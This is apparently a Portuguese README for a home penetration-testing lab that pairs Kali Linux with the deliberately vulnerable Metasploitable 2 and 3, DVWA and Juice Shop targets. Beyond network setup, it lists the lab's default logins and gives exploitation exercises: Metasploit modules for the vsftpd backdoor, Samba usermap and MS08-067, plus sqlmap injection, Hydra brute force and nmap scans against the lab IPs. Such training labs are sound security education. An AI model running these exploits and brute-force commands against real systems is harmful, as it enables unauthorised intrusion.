<p align="center">
  <img src="https://img.shields.io/badge/CyberLab-v1.0-blue?style=for-the-badge&logo=github"/>
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-green?style=for-the-badge&logo=windows"/>
  <img src="https://img.shields.io/badge/VMs-4-orange?style=for-the-badge&logo=virtualbox"/>
  <img src="https://img.shields.io/badge/Network-192.168.56.0%2F24-purple?style=for-the-badge&logo=network"/>
</p>

<h1 align="center">🖥️ CyberLab - Laboratório de Cybersecurity</h1>

<p align="center">
  <b>Laboratório completo para praticar penetration testing e ethical hacking</b><br>
  <i>Kali Linux • Metasploitable 2 & 3 • DVWA • Juice Shop</i>
</p>

---

## 📋 Índice

- [Visão Geral](#-visão-geral)
- [Arquitetura da Rede](#-arquitetura-da-rede)
- [Mapa de IPs](#-mapa-de-ips)
- [VMs Configuradas](#-vms-configuradas)
- [Instalação Rápida](#-instalação-rápida)
- [Configuração de IP](#-configuração-de-ip)
- [Como Usar](#-como-usar)
- [Exercícios](#-exercícios)
- [Apps Web (Docker)](#-apps-web-docker)
- [Comandos Vagrant](#-comandos-vagrant)
- [Solução de Problemas](#-solução-de-problemas)
- [Segurança](#-segurança)

---

## 🎯 Visão Geral

O **CyberLab** é um laboratório isolado e seguro para aprender cybersecurity na prática. Ele simula uma rede real com máquinas atacantes e alvos intencionalmente vulneráveis.

### O que está incluído:

| Componente | Descrição |
|------------|-----------|
| 🐉 **Kali Linux** | Distribuição com 600+ ferramentas de segurança |
| 💀 **Metasploitable 2** | Linux vulnerável (Ubuntu 8.04) |
| 💀 **Metasploitable 3** | Linux vulnerável (Ubuntu 14.04) |
| 🪟 **Metasploitable 3** | Windows Server 2008 R2 vulnerável |
| 🧃 **Juice Shop** | App web vulnerável (OWASP) |
| 🔥 **DVWA** | Damn Vulnerable Web Application |

### Pré-requisitos:

| Requisito | Mínimo | Recomendado |
|-----------|--------|-------------|
| 💾 **Disco** | 50 GB | 100+ GB |
| 🧠 **RAM** | 8 GB | 16+ GB |
| 🖥️ **CPU** | 4 cores | 8+ cores |
| 🌐 **Internet** | Sim | Sim |

---

## 🏗️ Arquitetura da Rede

```
┌─────────────────────────────────────────────────────────────────────┐
│                         WINDOWS HOST                                │
│                    (Sua máquina principal)                          │
├─────────────────────────────────────────────────────────────────────┤
│                       Oracle VirtualBox                             │
│                                                                     │
│    ┌─────────────────────────────────────────────────────────┐     │
│    │              INTERNET (Adapter 1: NAT)                   │     │
│    └─────────────────────────────────────────────────────────┘     │
│           │              │              │              │             │
│           ▼              ▼              ▼              ▼             │
│    ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐     │
│    │   KALI   │   │   MS2    │   │ MS3-Linux│   │MS3-Windows│    │
│    │   .10    │   │  .101    │   │  .102    │   │  .103    │     │
│    └────┬─────┘   └────┬─────┘   └────┬─────┘   └────┬─────┘     │
│         │              │              │              │             │
│         └──────────────┴──────────────┴──────────────┘             │
│                                                                     │
│    ┌─────────────────────────────────────────────────────────┐     │
│    │        INTERNAL NETWORK (Adapter 2: 192.168.56.0/24)    │     │
│    │              VMs comunicam DIRETAMENTE                   │     │
│    └─────────────────────────────────────────────────────────┘     │
│                                                                     │
│    ┌─────────────────────────────────────────────────────────┐     │
│    │                    DOCKER HOST (no Windows)              │     │
│    │   ┌────────────────┐     ┌────────────────┐             │     │
│    │   │  JUICE SHOP    │     │     DVWA       │             │     │
│    │   │ localhost:3000 │     │ localhost:8080 │             │     │
│    │   └────────────────┘     └────────────────┘             │     │
│    └─────────────────────────────────────────────────────────┘     │
└─────────────────────────────────────────────────────────────────────┘
```

### Configuração de Rede por VM

| VM | Adapter 1 (NAT) | Adapter 2 (IntNet) |
|----|----|----|
| Kali | DHCP (internet) | `192.168.56.10` |
| MS2 | DHCP (internet) | `192.168.56.101` |
| MS3-Linux | DHCP (internet) | `192.168.56.102` |
| MS3-Windows | DHCP (internet) | `192.168.56.103` |

---

## 🗺️ Mapa de IPs

### Tabela de Endereçamento

> ℹ️ **Configuração:** Cada VM tem 2 placas de rede. NAT para internet, Internal Network para o lab.

| Máquina | IP (IntNet) | Máscara | DNS | Portas Expostas |
|---------|-----|---------|-----|-----------------|
| 🐉 **Kali Linux** | `192.168.56.10` | 255.255.255.0 | 8.8.8.8 | 22 (SSH) |
| 💀 **Metasploitable 2** | `192.168.56.101` | 255.255.255.0 | 8.8.8.8 | 21,22,23,25,80,139,445,3306,5432,8080 |
| 💀 **Metasploitable 3 Linux** | `192.168.56.102` | 255.255.255.0 | 8.8.8.8 | 21,22,23,25,80,139,445,3306,8080,8181,8443 |
| 🪟 **Metasploitable 3 Windows** | `192.168.56.103` | 255.255.255.0 | 8.8.8.8 | 21,22,80,135,139,445,3389,5985,5986 |
| 🧃 **Juice Shop** | `localhost` | - | - | 3000 |
| 🔥 **DVWA** | `localhost` | - | - | 8080 |

### Diagrama de Portas

```
KALI LINUX (.10)
    │
    ├──▶ 192.168.56.101 (Metasploitable 2)
    │        ├── :21   FTP (vsftpd 2.3.4 - backdoor)
    │        ├── :22   SSH (OpenSSH 4.7)
    │        ├── :23   Telnet
    │        ├── :25   SMTP
    │        ├── :80   Apache httpd 2.2.8
    │        ├── :139  Samba 3.0.20
    │        ├── :445  Samba
    │        ├── :3306 MySQL 5.0.51a
    │        ├── :5432 PostgreSQL
    │        └── :8080 Apache Tomcat 6.0.18
    │
    ├──▶ 192.168.56.102 (Metasploitable 3 Linux)
    │        ├── :21   ProFTPd 1.3.5
    │        ├── :22   OpenSSH 6.6.1
    │        ├── :23   Telnet
    │        ├── :25   SMTP
    │        ├── :80   Apache httpd 2.4.7
    │        ├── :139  Samba
    │        ├── :445  Samba
    │        ├── :3306 MySQL 5.5.40
    │        ├── :8080 GlassFish 4.0
    │        ├── :8181 GlassFish (HTTPS)
    │        └── :8443 GlassFish
    │
    └──▶ 192.168.56.103 (Metasploitable 3 Windows)
             ├── :21   FTP
             ├── :22   OpenSSH
             ├── :80   IIS 7.5
             ├── :135  RPC
             ├── :139  NetBIOS
             ├── :445  SMB
             ├── :3389 RDP
             ├── :5985 WinRM
             └── :5986 WinRM (HTTPS)
```

---

## 🖥️ VMs Configuradas

### 1. 🐉 Kali Linux (Atacante)

| Propriedade | Valor |
|-------------|-------|
| **Nome VM** | `KaliLinux-Lab` |
| **IP** | `192.168.56.10` |
| **RAM** | 4 GB |
| **CPUs** | 4 |
| **OS** | Kali Linux 2026.2 |
| **Login** | `kali` / `kali` |
| **Função** | Máquina atacante |
| **Ferramentas** | Nmap, Metasploit, Burp Suite, Nikto, SQLMap, etc. |

### 2. 💀 Metasploitable 2 (Alvo Linux)

| Propriedade | Valor |
|-------------|-------|
| **Nome VM** | `Metasploitable2-Lab` |
| **IP** | `192.168.56.101` |
| **RAM** | 1 GB |
| **CPUs** | 2 |
| **OS** | Ubuntu 8.04 LTS |
| **Login** | `msfadmin` / `msfadmin` |
| **Função** | Alvo vulnerável (clássico) |
| **Vulnerabilidades** | vsftpd backdoor, Samba usermap, PHP vulnerabilities |

### 3. 💀 Metasploitable 3 Linux (Alvo Linux)

| Propriedade | Valor |
|-------------|-------|
| **Nome VM** | `Metasploitable3-Linux` |
| **IP** | `192.168.56.102` |
| **RAM** | 2 GB |
| **CPUs** | 2 |
| **OS** | Ubuntu 14.04 LTS |
| **Login** | `vagrant` / `vagrant` |
| **Função** | Alvo vulnerável (moderno) |
| **Vulnerabilidades** | GlassFish, Tomcat, ProFTPd, Samba, MySQL |

### 4. 🪟 Metasploitable 3 Windows (Alvo Windows)

| Propriedade | Valor |
|-------------|-------|
| **Nome VM** | `Metasploitable3-Windows` |
| **IP** | `192.168.56.103` |
| **RAM** | 4 GB |
| **CPUs** | 2 |
| **OS** | Windows Server 2008 R2 |
| **Login** | `vagrant` / `vagrant` |
| **Função** | Alvo Windows vulnerável |
| **Vulnerabilidades** | IIS, SMB, RDP, Multiple Users |

#### Usuários Metasploitable 3 Windows:

| Usuário | Senha | Privilegios |
|---------|-------|-------------|
| `vagrant` | `vagrant` | Administrador |
| `leah_organa` | `help_me_obiw@n` | Usuário |
| `luke_skywalker` | `use_the_f0rce` | Usuário |
| `han_solo` | `sh00t-first` | Usuário |
| `darth_vader` | `d@rk_sid3` | Usuário |
| `anakin_skywalker` | `yipp33!!` | Usuário |
| `boba_fett` | `mandalorian1` | Usuário |
| `chewbacca` | `rwaaaaawr5` | Usuário |
| `kylo_ren` | `daddy_issues1` | Usuário |

---

## 🚀 Instalação Rápida

### Opção 1: Instalação Automática (Recomendado)

```powershell
# 1. Clone o repositório
git clone https://github.com/SEU-USER/cyberlab.git
cd cyberlab

# 2. Execute o instalador (como Administrador)
.\install.ps1

# 3. Aguarde a conclusão
# 4. Inicie as VMs no VirtualBox
```

### Opção 2: Instalação Manual

```powershell
# 1. Clone o repositório
git clone https://github.com/SEU-USER/cyberlab.git
cd cyberlab

# 2. Baixe as VMs manualmente (veja DOWNLOADS.md)

# 3. Execute os scripts de configuração
```

---

## ⚙️ Configuração de IP

### Importante: Configure os IPs uma única vez!

Cada VM precisa ter seu IP estático configurado. Isso é feito **dentro de cada VM**.

> ⚠️ **Rede Interna não tem gateway!** Não configure gateway. As VMs se comunicam diretamente.

### 🐉 Kali Linux

**Acesse via terminal:**
```bash
# Execute o script de configuração
sudo bash /c/CyberLab/Scripts/setup-kali.sh

# OU configure manualmente:
sudo nano /etc/network/interfaces
```

**Conteúdo do arquivo:**
```bash
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address 192.168.56.10
    netmask 255.255.255.0
```

**Reinicie a rede:**
```bash
sudo systemctl restart networking
```

**Verifique:**
```bash
ip a
ping 192.168.56.101
```

---

### 💀 Metasploitable 2

**Acesse via terminal:**
```bash
# Execute o script de configuração
sudo bash /c/CyberLab/Scripts/setup-metasploitable2.sh

# OU configure manualmente:
sudo nano /etc/network/interfaces
```

**Conteúdo do arquivo:**
```bash
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address 192.168.56.101
    netmask 255.255.255.0
```

**Reinicie a rede:**
```bash
sudo /etc/init.d/networking restart
```

---

### 💀 Metasploitable 3 Linux

**Acesse via terminal:**
```bash
# Execute o script de configuração
sudo bash /c/CyberLab/Scripts/setup-metasploitable3-linux.sh

# OU configure manualmente:
sudo nano /etc/network/interfaces
```

**Conteúdo do arquivo:**
```bash
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address 192.168.56.102
    netmask 255.255.255.0
```

**Reinicie a rede:**
```bash
sudo restart networking
```

---

### 🪟 Metasploitable 3 Windows

**Execute como Administrador:**
```powershell
# Execute o script de configuração
C:\CyberLab\Scripts\setup-metasploitable3-windows.bat

# OU configure manualmente via PowerShell:
netsh interface ip set address "Local Area Connection" static 192.168.56.103 255.255.255.0
netsh interface ip set dns "Local Area Connection" static 8.8.8.8
```

**Verifique:**
```cmd
ipconfig
ping 192.168.56.10
```

---

## 📖 Como Usar

### Passo 1: Inicie as VMs

1. Abra o **VirtualBox**
2. Inicie **KaliLinux-Lab** primeiro
3. Inicie as VMs alvo (Metasploitable 2 e 3)

### Passo 2: Configure os IPs

Execute os comandos de configuração de IP em cada VM (veja seção anterior).

### Passo 3: Teste a Conectividade

No **Kali Linux**, execute:
```bash
# Ping em todos os alvos
ping 192.168.56.101
ping 192.168.56.102
ping 192.168.56.103
```

### Passo 4: Comece a Praticar!

---

## 🎯 Exercícios

### 📡 Nmap - Reconhecimento

```bash
# Scan básico de portas
nmap 192.168.56.101

# Scan com detecção de versão
nmap -sV 192.168.56.101

# Scan agressivo
nmap -A -T4 192.168.56.101

# Scan de vulnerabilidades
nmap --script vuln 192.168.56.101

# Scan em toda a rede
nmap 192.168.56.0/24
```

### 💥 Metasploit - Explotação

```bash
# Iniciar Metasploit
msfconsole

# vsftpd Backdoor (Metasploitable 2)
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
exploit

# Samba Usermap Script (Metasploitable 2)
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
exploit

# MS08-067 (Metasploitable 3 Windows)
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.56.103
exploit
```

### 🌐 Web Application Testing

```bash
# DVWA - Acesse no navegador
http://192.168.56.101/dvwa
Login: admin / password

# SQL Injection
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --dbs

# Nikto - Scanner de vulnerabilidades web
nikto -h 192.168.56.101

# Dirb - Enumeração de diretórios
dirb http://192.168.56.101

# Hydra - Brute Force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"
```

### 🔍 Enumeração de Rede

```bash
# Descobrir hosts ativos
netdiscover -r 192.168.56.0/24

# Enumeração SMB
enum4linux -a 192.168.56.101

# Enumeração SNMP
snmpwalk -v 2c -c public 192.168.56.101
```

---

## 🐳 Apps Web (Docker)

### Juice Shop (OWASP)

```bash
# Iniciar
docker run -d --name juice-shop -p 3000:3000 bkimminich/juice-shop

# Acessar
http://localhost:3000

# Parar
docker stop juice-shop
```

### DVWA

```bash
# Iniciar
docker run -d --name dvwa -p 8080:80 vulnerables/web-dvwa

# Acessar
http://localhost:8080

# Credenciais
Login: admin
Senha: password

# Parar
docker stop dvwa
```

### Iniciar Todos os Apps

```cmd
# Execute o script
C:\CyberLab\Scripts\start-webapps.bat
```

---

## 🔧 Comandos Vagrant

```bash
# Listar status das VMs
vagrant status

# Iniciar VM específica
vagrant up ms3-linux
vagrant up ms3-windows

# Parar VM
vagrant halt ms3-linux

# Reiniciar VM
vagrant reload ms3-linux

# Destruir VM
vagrant destroy ms3-linux

# Acessar via SSH
vagrant ssh ms3-linux

# Ver logs
vagrant ssh ms3-linux -c "dmesg"
```

---

## 🐛 Solução de Problemas

### VM não conecta à rede

```bash
# Verifique o IP
ip a

# Reinicie a rede
sudo systemctl restart networking

# Verifique o cabo virtual
# No VirtualBox: Settings > Network > Cable Connected ✓
```

### SSH não funciona (Vagrant)

```bash
# Reinicie a VM
vagrant reload ms3-linux

# Verifique se o SSH está rodando
sudo service ssh status
sudo service ssh start
```

### Docker não inicia

```cmd
# Reinicie o Docker Desktop
# Ou via PowerShell:
Restart-Service docker
```

### IP muda após reiniciar

Certifique-se de que configurou IP **estático** e não DHCP. Veja a seção [Configuração de IP](#-configuração-de-ip).

---

## ⚠️ Segurança

### Regras de Ouro

| # | Regra |
|---|-------|
| 1 | **NUNCA** exponha essas VMs para redes externas |
| 2 | Mantenha as VMs na rede CyberLab (NAT Network) |
| 3 | Use **snapshots** antes de testes |
| 4 | **NUNCA** use em máquinas de produção |
| 5 mantenha o VirtualBox atualizado |

### Snapshots

```bash
# Crie um snapshot antes de cada teste
VBoxManage snapshot "Metasploitable2-Lab" take "antes-do-teste"

# Restaure se algo der errado
VBoxManage snapshot "Metasploitable2-Lab" restore "antes-do-teste"
```

---

## 📁 Estrutura do Projeto

```
cyberlab/
├── 📄 README.md              # Este arquivo
├── 📄 .gitignore             # Arquivos ignorados pelo Git
├── 📄 install.ps1            # Instalador automático
├── 📁 scripts/
│   ├── 📄 setup-kali.sh           # Config IP Kali
│   ├── 📄 setup-metasploitable2.sh    # Config IP MS2
│   ├── 📄 setup-metasploitable3-linux.sh  # Config IP MS3 Linux
│   ├── 📄 setup-metasploitable3-windows.bat # Config IP MS3 Windows
│   └── 📄 start-webapps.bat       # Iniciar apps Docker
├── 📁 vagrant/
│   └── 📄 Vagrantfile              # Config Metasploitable 3
└── 📁 docs/
    └── 📄 NETWORK.md               # Documentação da rede
```

---

## 🤝 Contribuindo

1. Fork o projeto
2. Crie uma branch (`git checkout -b feature/nova-vm`)
3. Commit suas mudanças (`git commit -m 'Adiciona nova VM'`)
4. Push para a branch (`git push origin feature/nova-vm`)
5. Abra um Pull Request

---

## 📝 Licença

Este projeto está sob a licença MIT. Veja o arquivo [LICENSE](LICENSE) para detalhes.

---

## 🙏 Agradecimentos

- [Kali Linux](https://www.kali.org/) - Distribuição de segurança
- [Rapid7](https://www.rapid7.com/) - Metasploitable 2 e 3
- [OWASP](https://owasp.org/) - Juice Shop e DVWA
- [VirtualBox](https://www.virtualbox.org/) - Virtualização
- [Vagrant](https://www.vagrantup.com/) - Gerenciamento de VMs

---

<p align="center">
  <b>⚡ Feito com ❤️ para a comunidade de cybersecurity</b>
</p>

<p align="center">
  <a href="https://github.com/SEU-USER/cyberlab/stargazers">
    <img src="https://img.shields.io/github/stars/SEU-USER/cyberlab?style=social"/>
  </a>
  <a href="https://github.com/SEU-USER/cyberlab/network/members">
    <img src="https://img.shields.io/github/forks/SEU-USER/cyberlab?style=social"/>
  </a>
</p>
